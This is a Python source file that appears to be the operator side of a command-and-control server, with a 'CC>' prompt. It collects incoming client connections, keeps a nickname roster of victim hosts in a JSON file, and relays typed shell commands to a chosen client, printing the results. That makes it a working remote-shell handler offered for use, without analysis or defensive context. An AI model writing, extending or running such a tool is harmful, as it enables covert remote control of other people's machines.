import socket
import threading
import json
import os
import time
from tabulate import tabulate




Host = "127.0.0.1"
Port = 6565
client_list=[]
address_list = []


def data_read():
    while 1:
        with open('./Data/client_list.json') as f:
            global data 
            global data_header
            data = json.load(f)
            data_header = data['client_list'][0].keys()
        time.sleep(2)




def client_connected(server):
    while True:
        sam_client, sam_address = server.accept()
        client_list.append(sam_client)
        address_list.append(sam_address)


def connect(client):
    command = ''
    client.send(b'connect')
    while command != "close":
        pwd = client.recv(40960).decode('utf-8')+"->"
        while True:
            command = input(pwd)
            if command == "clear" or command == "cls":
                os.system('cls' if os.name == 'nt' else 'clear')
            elif command != "":
                break
        client.send(command.encode('utf-8'))
        print(f"{client.recv(1024).decode('utf-8')}")






if __name__ == "__main__":
    
    server = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server.bind((Host,Port))
    server.listen(10)
    client_collector = threading.Thread(target=client_connected,args=(server,))
    client_collector.start()
    data_reloader = threading.Thread(target=data_read)
    data_reloader.start()
    
    while True :
        command = input("CC>")  
        command = command.split(" ")

        match command[0]:

            case "connect" :
                for client in data['client_list']:
                    if client['NickName'] == command[1]:
                        IP = client["IP"]
                for client in client_list : 
                    raddr = client.getpeername()[0] if client else None
                    if raddr == IP :
                        print(f"[*] Connected to {command[1]} !!\n")
                        connect(client)
                    True
            
            case "list" :
                print(f"\n{tabulate([list(d.values()) for d in data['client_list']], headers=data_header)}\n")
            
            case "nick" :
                HostName,NickName = command[1],command[2]
                for client in data['client_list']:
                    if client["HostName"] == HostName:
                        client["NickName"] = NickName
                with open('./Data/client_list.json', 'w') as f:
                    json.dump(data, f,indent=4)
            
    
